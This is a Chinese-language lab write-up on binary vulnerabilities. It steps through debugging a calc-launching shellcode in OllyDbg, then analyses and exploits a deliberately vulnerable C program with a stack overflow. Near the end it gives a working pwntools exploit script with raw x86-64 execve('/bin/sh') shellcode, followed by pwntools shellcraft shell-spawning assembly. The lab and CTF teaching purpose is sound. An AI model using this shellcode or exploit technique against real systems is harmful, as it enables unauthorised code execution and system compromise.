---
title: 二进制漏洞 
date: 2019-10-08 00:54:24 
tags:
  - "网络空间安全"
  - "软件安全"
categories:
  - ["实验","漏洞分析"]
  - ["漏洞","二进制"]
  - ["漏洞","缓冲区溢出"]
comments: true

---

## 实验目的

了解二进制漏洞的基本原理，应用简单的调试技术调试shellcode程序，理解shellcode如何执行。

<!-- more -->
{% note info %} 本次实验2.1~2.2部分所使用的环境为Windows XP SP2，调试软件为Ollydbg。2.3部分所使用的环境为Ubuntu16.04LTS，调试软件为gdb。 {% endnote %}

## 步骤

### 初见shellcode程序

首先，利用SCer.exe启动给定的`sc2.bin`，将`sc2.bin`拖入对话框中，然后点击“执行Shellcode”，便会弹出计算器。 {% grouppicture 3-1 %} {% asset_img 0.png %} {%
asset_img 1.png %} {% asset_img 2.png %} {% endgrouppicture %}

### 调试shellcode程序

1. 把原来的`sc2.bin`拖入`SCer.exe`，然后点击“转成字符串”，即可得到下方所示文件

{% asset_img 3.png %} 在shellcode最前方加入`\xcc`（对应的汇编指令为`int 3`，该指令是系统的中断指令），然后重新转为`bin`文件，把生成的`.mybin`后缀名改掉，将其重新拖入对话框中。

2. 先不要点击“执行Shellcode”，打开Ollydbg，选择“附加进程”，找到SCer进程，点击“附加”。

{% asset_img 4.png "附加进程" %} 再点击“执行Shellcode”，注意程序输出的状态值。 {% asset_img 5.png "继续执行shellcode" %}

3. 程序运行到`0xe00000`时暂停。那个位置刚好是我们刚打下的断点。 {% asset_img 6.png %}

4. 所有的shellcode大概就是这样的，下图是全览。接下来将逐步解析。 {% asset_img 7.png %}

5. 跟随程序流，我们找到`0xe00057`的push语句，紧接着，它调用了函数`0xe00003`，跟入函数进去看看。 {% grouppicture 2-2 %} {% asset_img 8.png %} {% asset_img
   9.png %} {% endgrouppicture %}

6. 接着，程序向ESI寄存器写入了寄存器DS的值的偏移，此过程迭代了2次，EBX寄存器也被写了EBP的值的偏移，也迭代了2次。中间还注意到了ntdll的接口。 {% grouppicture 6-4 %} {% asset_img
   10.png %} {% asset_img 11.png %} {% asset_img 12.png %} {% asset_img 13.png %} {% asset_img 14.png %} {% asset_img
   15.png %} {% endgrouppicture %}

7. 下面是一个循环，不断把ES:[EDI]中的内容移入EDX中。 {% asset_img 16.png %}
8. 循环执行结束后执行到`0xe0004e`处，此时注意到EDI被写入了`kernel32.7c808c5d`的内容，有一个类似于`WriteConsoleA`
   的东西，猜想刚才的过程可能是为了寻找系统api的地址，然后把地址作为参数开启后续调用。这个函数执行完后就return回去了。 {% asset_img 17.png %} {% asset_img 18.png %}
9. 接下来是一个重头戏，在`0xe00062`处，push了一个"calc"字符串，然后将其移动到EDX寄存器上。 {% asset_img 19.png %}
10. 然后，过了几步后，程序把寄存器EBP上的内容视为函数并调用了它，观察到此时EBP的内容为`kernel32.WinExec`的地址，结合前面推入的`calc`参数，推测此时准备开始执行了计算器。跟入`WinExec`
    ，可以看到`CreateProcessInternalA`函数，创建了一个新进程。 {% asset_img 20-1.png %}
11. 此时的堆栈状态如下 {% asset_img 20-2.png %} {% asset_img 20-3.png %}
12. 接下来还有一组`PUSH-CALL 函数-PUSH EAX-CALL EBP`操作。可以看到，这次操作最终使得`kernel32.ExitProcess`被调用。推测是为了杀掉SCer进程。 {% grouppicture 3-2
    %} {% asset_img 23-ex.png %} {% asset_img 23-ex2.png %} {% asset_img 21.png %} {% endgrouppicture %}

13. 接下来就调试不下去了，程序已经陷入持续的访问违规当中了。但是留下那个计算器窗口已经完成了shellcode所给的任务了 {% asset_img 22.png %}

### 给定程序漏洞分析和利用

这次的漏洞程序给了源码，光直接阅读源码，就可以获得很多信息。

程序流程简单，从`main`函数开始，只经历了两个函数`init`和`bof`，而`init`函数中，只是简单初始化了缓冲区和调用`alarm()`，剩下给我们的只有`bof`函数了。

```c
int main()
{
	init();
	bof();
	return 0;
}

void init(void)
{
	setbuf(stdin,0);
	setbuf(stdout,0);
	setbuf(stderr,0);
	alarm(alarm_time);
	return;
}

```

从源码的Description注释中，我们观察到，这次要利用的漏洞为栈溢出漏洞，我们需要使用栈溢出方法，在栈上执行shellcode。

我们的目标是`egg()`函数，可以看到无论在哪个函数中，该函数都没有执行，我们需要想办法将程序的执行流程导向到`egg`函数中，来实现一个溢出的目的。

```c
void egg()
{
	__asm__ ("jmp *-0x30(%rsp);");
	//__asm__("sub rsp,0x30;jmp rsp;");
}
```

然后是本地实验最重要的分析目标`bof`函数，其中规定了一个48字节长的`char`数组作为缓冲区，然后将60字节的内容读入缓冲区`content`
中，在这个过程中，其实已经产生了漏洞点，当我们输入的内容大于等于48字节时，就可能会产生缓冲区溢出漏洞。但是，程序随后执行`strlen`函数进行一步检查，我们输入的内容大于等于48字节时，会触发提示"Detect bof"
，使得程序退出。越过了这一层检查，还有一层检查是用来过滤坏字符的，这一步的过滤比较轻，只检查了"0xaa"和"0xbb"两种字符。

```c
void bof(void)
{
	char content[48]={0};
	puts("Input your content: ");
	read(0,content,60);
	if(strlen(content)>=48)
	{
		puts("Detect bof!");
		exit(-1);
	}
	if(!check_input(content))
		exit(-1);
	return;
}
bool check_input(char *ss)
{
	char filter[8] = {'\xaa','\xbb'};
	for(int i=0;i<filter_num;i++)
	{
		for(int j=0;j<strlen(ss);j++)
		{
			if(ss[j]==filter[i])
				return false;
		}
	}
	return true;
}
```

能不能绕过所有错误提示，顺利触发程序的溢出点，进入到`egg`函数中呢？

1. 先运行一遍程序，直观感受程序流程。 {% asset_img 24.png %}
    - 输入较少字数的content时，程序无错退出，但这不是我们本次练习的目标。
    - 当content输入字数增加时，会看到"Detect bof!"的提示，能明显看到，后面又多出了几个"f"的输入，这大概就是输入溢出的体现了。（因为后面溢出的字符被当成命令执行了）
2. 用gdb打开这个可执行程序，然后使用`checksec`检查程序的保护。 {% asset_img 25.png %} {% asset_img 26.png "checksec检查结果" %} {% note info %}
   检查结果是没有开启任何保护，有可写可读可执行段，是我们漏洞利用的前提。 {% endnote %}

3. 先在几个函数下断点。我选择`egg`、`bof`和`check_input`三个函数下打上断点。
4. 执行`b`命令时可以看到断点的地址。大概判断`egg`函数的地址在`0x40079c`处，`bof`在`0x40082e`处，`check_input`在`0x4007a9`处。 {% asset_img 27.png %}
5. `disassemble`命令看一下`egg`函数的汇编，左侧显示`egg`函数的头部在`0x400798`处，恰好对应于上图的`0x40079c-4`处， {% asset_img 28.png %}
6. 按下<kbd>r</kbd>键开始运行程序，程序停在了输入点中。 {% asset_img 29.png %}
7. 这是输入一个字母"a"后，栈的相关情况。我们可以看到，RAX、RSI、RDI寄存器中都推入了一个"a"的值(`0x61`)
   {% asset_img 30.png %} 而栈的情况也是向`0x7fffffffde70`处相应地有一个`0x61`的值，在栈相对位移的`0x10`处。 结合上图的RIP指针和下图的`backtrace`
   来看，下一步断点位将是在`check_input`偏移值+4处。地址为`0x4007a9`处。 {% asset_img 31.png %}
8. 按下<kbd>c</kbd>键，继续执行程序。程序正常结束，代表正常经过了`check_input`过程。 {% asset_img 32.png %}
9. 如果继续运行程序，但是构造一个比较长的字符串时，寄存器的情况如下。 {% asset_img 35.png %} 此时RDI指向"Detect bof!"，RIP指向`push`函数的地址，在下方的栈显示中也看到"a"
   越过了0048的限制。 {% asset_img 36.png %}
10. 先看payload的运行效果 {% asset_img 38.png %} {% note info %} 可以看到，switching to interactive mode之后，有一个小的`$`
    号出现在shell的左侧，这是一个小shell(`bin/sh`)，可以执行一些简单的命令，在CTF的pwn题中经常用于反弹shell，获取flag文件。 {% endnote %}
11. 接下来，调试一下payload输入，把它输入到gdb调试进程中。 {% grouppicture 2-2 %} {% asset_img 39.png %} {% asset_img 40.png %} {%
    endgrouppicture %} 可以观察到输入的内容位于RSI（`0x7fffffffde70`）中，在RBP中看到了"/bin/sh"
    的字样，这是Linux下的一种shell。然后在栈中看到了被“截断”的序列`\x00H1\xffH1`。中间隔离了一些内容后，下方被注入了`bin/sh`字符串。随后在`puts`调用时，`bin/sh`
    被推到RBP上，在函数退出后，`bin/sh`将会执行，中间的一些地址应当是`bin/sh`的地址。 {% grouppicture 3-3 %} {% asset_img 41.png %} {% asset_img 42.png
    %} {% asset_img 43.png %} {% endgrouppicture %}

最终的payload代码如下所示 {% codeblock lang:python line_number:false %} from pwn import *

# p=remote()

p=process('./sc2')

# addr_egg = 0x400798

payload='a'*7+"\x00"+"
\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
+"b"*5+p64(0x400798)
print p.recv()

p.sendline(payload)
p.interactive()
{% endcodeblock %}

## 实验难点及收获

软件的使用方面，这次使用了windbg和gdb完成实验，其中gdb是第一次使用，操作比较陌生，不太熟练（主要是，不太适应命令行环境），但通过这一次的练习，我感受到它确实是一个功能非常强大的软件，可以在运行的同时实时查看堆栈的情况，还可以用来打印出重要函数的地址，方便payload使用它，是除windbg外个人接触的第一款Linux端调试软件。今后还会使用到gdb的更多命令，也会为ctf的pwn题打下充分的基础。

POC的编写方面，作为Python的重度使用者，当然是选择使用pwn这个功能众多的Python库，以往看一些CTF比赛的writeup时，大多数的pwn题都用到了pwn来编写payload，从实际使用上来说，pwntools确实功能强大，就pwn题来说，可以根据操作系统版本生成不同的shellcode，也可以用elf工具查看got表、plt表地址，参加CTF比赛时也有交互功能，本身也提供很多实用的小工具。

## 实验思考

### Pwn库中一些shellcraft.arch.os的运行结果和含义

{% note info %} 资料来源于http://docs.pwntools.com/en/stable/shellcraft.html
{% endnote %} {% tabs run_res, 1 %}
<!-- tab <code>shellcraft.amd64.linux.sh</code> -->
{% codeblock lang:asm %} /* execve(path='/bin///sh', argv=['sh'], envp=0) */ /* push '/bin///sh\\x00' */ push 0x68 mov
rax, 0x732f2f2f6e69622f push rax mov rdi, rsp /* push argument array ['sh\\x00'] */ /* push 'sh\\x00' */ push 0x1010101
^ 0x6873 xor dword ptr [rsp], 0x1010101 xor esi, esi /* 0 */ push rsi /* null terminate */ push 8 pop rsi\
add rsi, rsp push rsi /* 'sh\\x00' */ mov rsi, rsp\n xor edx, edx /* 0 */ /* call execve() */ push SYS_execve /* 0x3b */
pop rax syscall {% endcodeblock %} 大体上来看，是利用函数指针来调取系统的`sys_execve`函数，传入"bin/sh"作为参数，最后引起调用
<!-- endtab -->
<!-- tab <code>shellcraft.i386.linux.sh</code> -->
{% codeblock lang:asm %} /* execve(path='/bin///sh', argv=['sh'], envp=0) */ /* push '/bin///sh\\x00' */ push 0x68 push
0x732f2f2f push 0x6e69622f mov ebx, esp /* push argument array ['sh\\x00'] */ /* push 'sh\\x00\\x00' */ push 0x1010101
xor dword ptr [esp], 0x1016972 xor ecx, ecx push ecx /* null terminate */ push 4 pop ecx add ecx, esp push ecx /* '
sh\\x00' */ mov ecx, esp xor edx, edx /* call execve() */ push SYS_execve /* 0xb */ pop eax int 0x80 {% endcodeblock %}
除了一些指令集的不同外，整体的效果和过程与amd64架构一致。
<!-- endtab -->
{% endtabs %}

还有更多的架构和更多可运行的shell指令，这里就不一一列出了，今后的漏洞挖掘中可能还会利用到它们。
